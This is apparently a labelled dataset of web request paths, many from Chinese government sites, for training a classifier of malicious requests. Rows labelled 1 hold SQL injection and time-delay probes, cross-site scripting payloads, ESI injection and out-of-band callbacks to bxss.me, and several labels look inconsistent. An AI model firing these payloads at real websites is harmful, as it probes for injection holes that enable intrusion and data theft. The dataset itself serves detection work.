sentences	labels
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u9a6c\u83b2\u6e20\u4e61\u9a6c\u83b2\u6e20\u6751\u571f\u5730\u80a1\u4efd\u4e13\u4e1a\u5408\u4f5c\u793e 	 0
/if(now()=sysdate(),sleep(3),0)/************/guzhiqihuo/ 	 1
/about-southwest/******/2020-11-22/10314.html 	 0
/****/gjzqq/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/***/col4295/index.html/""><script>alert(875)</script> 	 1
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqrlzyshbzt/201609/t20160930_317909.html 	 0
/**/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u4e07\u548c\u767e\u8d27\u5546\u884c 	 0
/******/457/jquery.ellipsis' and 2*3*8=6*8 and 'ukre'='ukre.js 	 1
/****/2013-04/17/content_405013.htm 	 0
/****/qzfwj/201801/t20180115_669582.html/index_1.html 	 0
/**********/system/2021/02/06/013333632.shtml 	 0
/******/zz-main.css 	 0
/****/zgsdt/2019_qydt/201909/t20190929_223716.html 	 0
/****/czgk/bmjs/qtdw/zzqgatjjzd/202108/t20210818_2979838.html 	 0
/***/nbhd/opengovmsgbox.do?pageindex=1&siteid=115); waitfor delay '0:0:2&method=listgovmsgboxs&pagesize=15&appid=4 	 1
/**/index.php?do=post&id=310&c=dt&a=goods& 	 1
/****/zjdt%' and 2*3*8=6*8 and 'qf91'!='qf91%/zjdt/gzdt.htm 	 1
/****/zzxxgk/tjj'""()&%<acx><script >8m5j(9218)</script>/zfxxgkml_2127/xwfbh_2065/list.html 	 1
/****/xqdt/jtx/201610/t20161025_43727.html 	 0
/**********/system/2020/05/31/013174397.shtml 	 0
/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1<esi:include src=""http://bxss.me/rpb.png""/>&tpl=16&websiteid=110105008056111 	 1
/**********/system/2017/04/18/012290069.shtml 	 0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4eba\u6c11\u8857\u75af\u72c2\u70e4\u7fc5\u5e97 	 0
/"".gethostbyname(lc(""hithy"".""fbigyjrx95ad5.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(65).chr(116).chr(80).""/****/202012/t20201225_2539623.html 	 1
/****/zpdt/202002/t20200227_243421.html and 1=1 	 1
/***/0/01/75/47/1754779_011836.jpg 	 0
/*****/system/2020/08/17/javascript:window.close(); 	 1
/******/resource/pdfjs/build/ms/index.jsp/""><script>alert`20336`</script> 	 1
/***/0/02/12/39/2123995_328980.png 	 0
/****/bmkx/index_11.html 	 0
/***/0/02/12/33/2123364_714106.jpg 	 0
/***/2018/4/2/art_31_20301.html 	 0
/****/bmkx/sfgw/202104/w020210409361236223246.jpg 	 0
/****/\ufffd\ufffd\ufffd\ufffd\ufffd\u017f\ufffd 	 0
/******/usercenter/index?qrcode=quicklyrq,3,157952,74728&code=051zou200yl82n1miq100swqah0zou2r 	 0
/****/zt/hjbhdc/201807/t20180706_872903.html 	 0
/*******/qiye/home-e42738.html 	 0
/*******/qiye/b-e2326828.html 	 0
/************/categorysearch.do?cateid=1&eq=1'""()&%<acx><script >zsez(9531)</script>&oq=1&p=1&pg=15&pos=1&pq=1&q=请输入关键词&ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111 	 1
/****/zjdt/ghby/if(now()=sysdate(),sleep(12),0)/1.htm 	 1
/******/system/2014/12/15/011583933.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u82cf\u9ad8\u9600\u79d1\u5de5\u8d38\u6709\u9650\u516c\u53f8 	 0
/****/system/2021/12/16/013495070.shtml 	 0
/****/czgk/bmjs/zzqfyxt/zwszjrmfy/ 	 0
/**/system/2021/10/29/012213063.shtml 	 0
/******/jquery.superslide.js 	 1
/****/zdgz/2020_zdgz/202110/gygj/jtgg/gjglry/ 	 0
/****/xxczh1/zcwj/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm 	 1
/***/index.php?c=user</textarea>--><xss_0404ae313785df44832170f156ac5359/><!--<textarea>&a=login 	 1
/****/zt/2020wznb/gznbxjzf/202101/p020210128369564549448.pdf 	 0
/***/0/00/71/34/713424_962233.jpg 	 1
/****/zjd7oc-article-e108144925.html 	 0
/*****/system/2016/05/04/011996716.shtml 	 0
/**********/system/2020/09/10/013244049.shtml 	 0
/'""()&%<acx><script >rsbr(9272)</script>/210514-1/*****/93aa5449bf388d846409a3d11e199a08.css 	 1
/****/jcgj/201411/w020141125645236591084.jpg 	 0
/**/system/2021/11/25/012225393.shtml 	 0
/**********/system/2020/06/12/013184083.shtml 	 0
/**********/system/2020/04/29/013152063.shtml 	 0
/****/20211012/n.src 	 0
/zwxx_11337/****/mtjd/index_4.html 	 0
/****/zggj 	 0
/****/qzfwj/202006/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a> 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(4758)">?_=1630312122674 	 1
/**********/system/2021/01/08/013316948.shtml 	 0
/****/zt/fgfgg/201812/t20181226_1232027.html 	 0
/***/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> 	 1
/****/xyfw/images/ 	 1
/****/zjdt/ghby/if(now()=sysdate(),sleep(12),0).htm 	 1
/*******/201901/201901161842541175.html 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/*****/1088/1105/list.html 	 1
/******/download/downfile.jsp?classid=0') and 8584=8584 and ('pykz'='pykz&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls 	 1
/***/col16/index.html"" and ""x""=""y 	 1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrteki/oytw3rep4w0mido1mc=&openid=ovl7jjto8ralltbu8zqyd38pechw&outer_str=42980&activate_ticket=fdzv9emqaffrnr3xboqhbyd3f21g8teh2jwjbwmar7noo8dbj5 fzedtzplsmcartcbkdjnftpbe1nhqbtysiy/lzxhsb2x87xsgm5fvhyo= 	 0
/*******/xxgkzd/list.html 	 1
/**/system/2021/06/02/012165882.shtml 	 0
/*********/img/2021-12-21/1640053165_171644.jpg 	 0
/****/b-e1066338.html 	 0
/****/zgsdt/2010zgsdt/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
socket.gethostbyname('hitrr' 'oofltmaca6b53.bxss.me.')[3].to_s) '/*****/sz/202108/t20210806_185416.html 	 1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7ea2\u6d01\u670d\u88c5\u5e72\u6d17\u5e97 	 0
/******/http://bxss.me/t/xss.html? 	 1
/**********/system/2021/11/30/013487790.shtml 	 0
/******/system/2017/09/02/012404822.shtml 	 0
/******/system/2019/04/03/javascript:void(); 	 1
/****/general/diary/new/submit.php 	 1
/****//518/no7m5rvt/xhr_send?t=1632341343482 	 1
/***/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
/****/mtgz/2015_mtdt 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u8679\u7131\u70e4\u5427 	 0
/*****/system/2021/10/26/javascript:void(); 	 1
/****/category/silujinrong?page=1'""()&%<acx><script >6dkn(9420)</script> 	 1
/****/xqdt/jyx/201610/t20161025_47900.html 	 0
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) 	 1
/*****/zp-core/admin-upload.php?error=<script>alert(777)</script> 	 1
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqxcb/\"javascript:void(0)\" 	 1
/***/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) 	 1
/****/zzxxgk/wsjkwyh/ggxcc/202003/w020200318647773150302.jpg 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u7fa4\u76ca\u4fdd\u6e29\u6750\u6599\u7ecf\u9500\u90e8 	 0
/**********/system/2012/09/25/010895827.shtml 	 1
/****/mswpmm/common/newaccount.aspx?email=alert(777) 	 1
/****/czgk/bmyjs/zzqjcyxt/znxrmjcy 	 0
/****/mtgz/2019_mtgz/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
/**********/system/2020/04/03/013131371.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4fca\u8d5b\u5efa\u6750\u6709\u9650\u516c\u53f8 	 0
/******/xsd/ 	 0
/***/mobile_h5/waparticledetail.do?article_id=202112201037071032&contenttype=article 	 0
/******/download/downfile.jsp?classid=0&filename=8ffb8746f7374969ba1a903f538b94d4.doc%' and 3001=3001 and '%'=' 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f20\u632f\u9f99\u5e7f\u544a\u90e8 	 0
/***/col31/index.html/<img src="javascript:alert(752)"> 	 1
/**/system/2021/11/30/012226319.shtml 	 0
/***********/zaojianpinglun/?_=1640036098659 	 0
/***/web/sa3/addholiday.do 	 1
/enjoymobilexcx_mt/****/getpicverifycode?mobile=101834157&type=\u9884\u7ea6&dt=1640016076411 	 0
/*****/gy42/cpgyss.asp?key=\u73bb\u7483\u94a2\u5c4b\u9876\u98ce\u673a\u600e\u4e48\u6837\u4f7f\u7528\u8bf4&l2=\ufffd\u017d\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/**/' and 'x'='x 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=37868 	 0
/****/yb/ 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u56fd\u4eba\u6c11\u8d22\u4ea7\u4fdd\u9669\u80a1\u4efd\u6709\u9650\u516c\u53f8\u9752\u94dc\u5ce1\u652f\u516c\u53f8\u9752\u9547\u8425\u4e1a\u90e8 	 0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/*****/flfg.htm 	 1
/*****/classifier,ruleset.jsp?action_flag=&page=1&kw="/><script>alert(777)</script>&id=&domain=&keyword=&points= 	 1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/202112/w020211209405112896443.png 	 0
socket.gethostbyname(""hitcs"" ""odqezdyebf7d1.bxss.me."")[3].to_s) ""/*/jquery.db_tabmotionbanner.min.js 	 1
/xinanyanjiu'||'/************/guzhiqihuo/2021-01-22/1713.html 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u5973\u738b\u7684\u5b69\u5b50\u6bcd\u5a74\u751f\u6d3b\u9986\u6d77\u60a6\u4e8c\u5e97 	 0
/****/category/fengxianfangfan 	 1
/zwxx_11337/****/202105/t20210527_2859918_zzb.html 	 0
/**********/system/2021/12/16/013495277.shtml 	 0
/**/api/sources?resource=alert(/777/)&format=txt 	 1
/****/qzfwj/201801/t20180115_669615.html 	 0
/****/dzzb/201411/ 	 1
/****/zzxxgk/wsjkwyh/xxgk_3565/ 	 0
/****/sswkxj/qydt/202110/t20211029_319785.html 	 0
/***/2020/12/25/0""xor(if(now()=sysdate(),sleep(15),0))xor""z_37_224319.html 	 1
/****/dqgz/202004/t20200426_246308.html 	 0
/****/mavideo/gvideos.php?gid=1 and 1=2 	 1
/****/zzxxgk//xfs.bxss.me/zfxxgkml_2127/xwfbh_2065/list.html 	 1
/art"" and 2*3*8=6*8 and ""q9gg""=""q9gg/****/8/23/art_32_237912.html 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u78ca\u946b\u5efa\u7b51\u673a\u68b0\u52a0\u5de5\u5382 	 0
/***/0/02/12/43/2124398_936096.jpg 	 0
/****/xqdt/hnx/201610/w020161025738503893363.jpg 	 0
/****/system/2021/10/01/javascript:window.close(); 	 1
/art'||'/****/10/3/art_31_242050.html 	 1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u300a\u676d\u5dde\u5e02\u7269\u4e1a\u7ba1\u7406\u6761\u4f8b\u300b 	 0
/****/20211012/javascript:void(0); 	 1
/****/czgk/bmjs/rmtt/kx/202108/t20210818_2978446.html 	 0
/******/gl-libg.png 	 0
/****/dqgz/202102/t20210216_270566.html 	 0
/******/public/2021/12/20/20211220_17dd5bf5614_r1_1200k.mp4 	 0
/****/system/2021/05/20/javascript:window.print() 	 1
/****/zzxxgk/tyj/gkmltyj/jytabljg 	 0
/**/ui/lib/easyui<esi:include src=""http://bxss.me/rpb.png""/>/plugins/jquery.linkbutton.js 	 1
/****/search.jspx?q=输入关键字</textarea>--><xss_83a6e70adcf7d0bd720b0d77530deee2/><!--<textarea> 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u897f\u590f\u5546\u884c 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u4f59\u4e3d\u73b2\u670d\u88c5\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8001\u90ed\u88c5\u9970\u6750\u6599\u7ecf\u9500\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a&page=12 	 0
/**********/system/2021/07/26/013425455.shtml 	 0
/*******/844691.html 	 0
/****/bmkx/sgaj/201806/w020180612360046677116.jpg 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=22535 	 0
/****/0427/159339.shtml 	 0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u52c7\u6167\u7433\u51c9\u76ae\u5e97 	 0
/****/2012jtdt 	 0
/**/dsp_editcreative.cfm?attributes.siteid="">alert(777) 	 1
/****/b-e1124895.html 	 0
/******/download/downfile.jsp?classid='.gethostbyname(lc('hitui'.'xgzfostl7fa0b.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(98).chr(71).chr(109).chr(67).'&filename=6aa38c8fa3484cb9b13a34cb28ac83de.docx 	 1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/tb/201802/t20180223_693450.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u7ea2\u71d5\u9601\u670d\u88c5\u5e97 	 0
/**********/system/2021/09/06/ data:image/svg xml,<svg viewbox= 	 1
/****/qzfwj/5619/5621/index_22.html 	 0
/**********/system/2021/07/02/013412846.shtml 	 0
/******/public/2021/12/17/20211217_17dc87824d6_r1.mp4 	 0
/****/jtdt/2015_jtdt 	 0
/****/zzxxgk/tjj/zfxxgkml' and 2*3*8=6*8 and 'zsfy'='zsfy_2127/xwfbh_2065/list.html 	 1
/****/zt/msss/msxw/201809/t20180919_1067187.html 	 0
/****/web/search/search?page=3&channelid=287219&searchword=1' and 2987=2987 and 'memo'='memo&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
/**/index.php?c=dt&a=bpay_bill&do=display&project_code=bpr001236&project_batchno=&bill_no=&user_idno=&biller_member_no=&user_name=&batch_name=&create_time[start]=2021-12-15&create_time[end]=2021-12-21&pay_time[start]= &pay_time[end]= &pay_status=&select=select 	 0
/****//xfs.bxss.me/202107/t20210723_2938511.html 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6842\u5174\u6c34\u6696\u4f9b\u5e94\u7ad9 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u948a\u6d0b\u5efa\u6750\u7ecf\u9500\u90e8 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u964d\u8d39 	 0
/******/system/2020/03/22/013121582.shtml 	 0
/*****/gy42/ljcpgyview.asp?id=28322927&l2=\ufffd\ufffd\u027d&l=\ufffd\u3dab 	 0
/****/jtdt/2019_jtyw/index_2.html 	 0
/zwxx_11337/****/202103/t20210301_2611209.html 	 0
/**********/system/2021/10/17/javascript:void(0); 	 1
/****/xqdt/hnx/201610/t20161025_50908.html 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd 	 0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u91d1\u83b1\u514b\u978b\u5e97 	 0
/***********/qiquanzhuanti/2017-02-16/292.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u9999\u9999\u751f\u725b\u7f8a\u8089\u5e97 	 0
/***/getlist?vno=3.5.0×tamp=1639973007723& 	 0
/***/getsubject?data={"subject_id":480,"channel_type":10,"page":1,"page_size":15,"account_id":173768,"sign":""} 	 0
/*******/kn3ku.php 	 1
/****/zjdt/fdcgl/if(now()=sysdate(),sleep(12),0)/1.htm 	 1
/************/categorysearch.do?cateid=1&p=bxss.me&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 	 1
/***/0/02/12/29/2122914_043082.jpg 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u96c5\u5c1a\u7f8e\u5bb9\u9986 	 0
/investors-garden' and 2*3*8=6*8 and 'e2ua'='e2ua/***/index_2.html 	 1
/**/index.cfm?email="">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin 	 1
/*****/gy42/ljcpgyview.asp?id=29515843&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/**/?icl_action=reminder_popup&target=javascript:alert(777);// 	 1
/******/system/2018/02/07/javascript:void(0); 	 1
/'.gethostbyname(lc('hituf'.'vrlsbmmz880d1.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(119).chr(71).chr(120).chr(90).'/******/list.html 	 1
/*****/dmqh/images/37.gif 	 0
/***/0/10/41/42/10414282_967086.jpg 	 0
/****/czgk/bmjs/zzqfyxt/xjxrmfy/202108/">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a> 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u767e\u90a6\u6570\u8054\u624b\u673a\u4e13\u5356\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4e2d\u5efa\u6750\u6d5a\u946b\u5149\u4f0f\u6709\u9650\u516c\u53f8 	 0
/*****/gy42/cpgyss.asp?key=unbt-\ufffd\ufffd\u023b\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/******/download/downfile.jsp 	 1
/****/201706/'http:/leyubet1410.com/' 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u8fd0\u901a\u6c7d\u914d\u90e8 	 0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqhtglzx/201708/t20170818_549517.html 	 0
/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/************/guzhiqihuo/index_2.html 	 1
/****/xqldly/hfpcsj/zmhdyc.html 	 0
/****/xxgkml/gfgy/ghbg/wngh/202107/t20210721_184790.html 	 0
/*****/gy42/ljcpgyview.asp?id=29634202&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u3f6d 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u674e\u5b81 	 0
/***/xxgk/zycwxx/bqsm/kjcx/xyfw/jcjg/gygj/ssgs/xwzx/jtdt/ 	 0
/*******/qiye/b-e1159014.html 	 0
/**********/system/2021/10/06/013460726.shtml 	 0
/*******/qiye/b-e1491156.html 	 0
/**/ui/lib/http://bxss.me/t/fit.txt/plugins/jquery.linkbutton.js 	 1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u97e9\u6c38\u5f3a\u6c7d\u8f66\u7ef4\u4fee\u4e2d\u5fc3 	 0
/******/?icl_action=reminder_popup&target=javascript:alert(777);// 	 1
/****/bmkx/szzb/index_wap_7.html 	 0
/******/system/2019/06/14/012903483.shtml 	 0
/****/bmkx/sfgw/201911/w020191124410195299021.jpg 	 0
/****/wzdgkj-hynews-e112014605.html 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery19109782783149271255_1639972959403 	 0
/investors-garden' and 2*3*8=6*8 and 'clwk'='clwk/**********/graphic/2020-02-27/8981.html 	 1
/*******/qiye/20211126/e142437851.html 	 0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u57ce\u90ca\u8116\u5ba2\u70e4\u9e2d\u8116\u5e97 	 0
/***/0/01/28/02/1280226_286071.jpg 	 0
/****/bmkx/ggjyzx/202101 	 0
/****/cgi-bin/ipinfo.cgi?alert(777) 	 1
/***/index.php?c=user&a=login</textarea>--><xss_0404ae313785df44832170f156ac5359/><!--<textarea> 	 1
/**/system/2021/09/12/javascript:void(0); 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u9e3f\u6069\u8d27\u8fd0\u4fe1\u606f\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u8c22\u827a\u5e7f\u544a\u8bbe\u8ba1\u90e8 	 0
/***/003/003/721/00300372183_089bf0a0.jpg 	 0
/**/wp_rokbox/thumb.php?src=<body onload=alert(777)>.jpg 	 1
/***/0/02/12/42/2124243_148848.png 	 0
/******/myd.jpg 	 0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u4e34\u6cb3\u9547\u4e0b\u6865\u5546\u5e97 	 0
/******/jzx1.swf 	 0
/***/0/02/02/14/2021464_997102.jpg 	 0
/***/0/02/11/93/2119311_434848.png 	 0
/****/0318/350764.shtml 	 0
/***/003/004/473/00300447381_43b27a6e.jpg 	 0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9ebb\u8fa3\u5973\u7687\u9ebb\u8fa3\u70eb\u5e97 	 0
/*****/queues.jsp?queuefilter=yu1ey"><script>alert("1")</script>qb68 	 1
/***/javascript:void(0); 	 1
/****/zt/2017wznb/zzqbm/201803/p020180320607919336779.pdf 	 0
/***/col6/index.html"" and ""x""=""x 	 1
/***/server-session-details.jsp?hostname=""/>alert(777) 	 1
/******/system/2018/01/11/javascript:void(); 	 1
/**/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
/**********/2021-0'xor(if(now()=sysdate(),sleep(9),0))xor'z-02 .html 	 1
/*******/202010/202010241140501018.html 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u76f8\u5764\u5546\u8d38\u6709\u9650\u516c\u53f8 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033') and 9597=9597 and '1'='1&owner=1707212448 	 1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202103/t20210329_179039.html 	 1
/**********/system/2021/09/07'"/><iframe src=javascript:alert(793)>/013447361.shtml 	 1
/*****/javascript/bxslider-4/jquery.bxslider.js/""><script>alert(12)</script> 	 1
/****************/notification?access_token=d771e49d-d603-40d7-8323-e17371831ca8&id=undefined 	 0
/****/szyw/2020_szyw/index.html 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5927\u4eac\u5178\u78b3\u7d20\u5236\u54c1\u6709\u9650\u516c\u53f8\u4e00\u5206\u516c\u53f8 	 0
/**********/system/2020/01/27/013065410.shtml 	 0
/****/advancedsearch.php?mid=1&sql=insert into #@__vote(votename,aid) select 1200,18455  	 1
/****/20201005/e107929128.html 	 0
/******/xxsjd/jd/ 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u6d8c\u6cf0\u8db3\u6d74\u5e97 	 0
/****************/file/loadimage/?id=9bd0b763-a6b4-4950-90a6-87249f26b15e&dt=2021-11-23_09:45:11 	 0
/************/template/jcse/110105008056111/'""()&%<acx><script >67jp(9869)</script>/images/ui.css 	 1
/***/0/10/14/25/10142593_378146.jpg 	 1
/****/bmkx/rmyh/202112/t20211220_197989_wap.html 	 0
/******/system/2019/06/23/012910993.shtml 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u6c49\u663e\u6536\u8d2d\u7ad9 	 0
/****/xqldly/hfbyqz/202006/t20200626_168418.html 	 0
/****/ztly/xxdj%' and 2*3*8=6*8 and 'hkn0'!='hkn0%/201911/t20191122_1859276.html 	 1
/****/zjdt/zjdt' and 2*3*8=6*8 and '7dmw'='7dmw/gzdt.htm 	 1
/****/"><script>alert(72)</script> 	 1
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u6539\u9769 	 0
/****/xqdt/byq/202011/t20201109_173717.html 	 0
/*****/system/2021/12/16/javascript:window.print() 	 1
/**********/system/2015/12/31/011902670.shtml 	 0
/*****/system/2009/05/13/002739971.shtml 	 0
/****/czgk/bmjs/zzqjcyxt/hnqrmjcy/\"javascript:void(0)\" 	 1
/****/20210927/10506.html 	 0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqzfyjs/201609/t20160923_318487.html 	 0
/****/mtgz'||'/2021_mtgz/202107/t20210712_310551.html 	 1
/****/fkxxfy/202108/t20210816_185761_wap.html 	 0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u8d5b\u552f\u5546\u8d38\u6709\u9650\u516c\u53f8 	 0
/*******/zzxxgk/tjj/ 	 1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u65f6\u5149\u5012\u6d41\u4f11\u95f2\u4f1a\u6240 	 0
/****/xyfw/jcjg/ and 1>1 	 1
/**/system/2021/07/02/javascript:void(0); 	 1
/**********/system/2021/01/04/013313662.shtml 	 0
/***/2021/10/29/art_34_243738.html 	 0
/****/zt/msss/msxw/201710/t20171016_518465.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u76ca\u65b0\u517b\u6b96\u573a 	 0
/******/system/2021/07/18/013420872.shtml 	 0
/****/js/chunk-2d21d043.2d9a5813.js 	 0
/*/201020-1/bxss.me/t/xss.html? 	 1
/***/interface/url_total_pv.json.jsp?callback=jquery191009688235603078077_1639980361491 	 0
/*******/qiye/businesses-e36518_210.html?category_id= 	 0
/******/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/layout.css 	 1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8d3e\u5858\u4e61\u53ec\u8363\u517b\u6b96\u573a 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e3d\u6770\u7f8e\u5986\u5e97 	 0
/**********/system/2014/05/05/011388125.shtml 	 1
/****/201909/t20190926_1757649.html 	 0
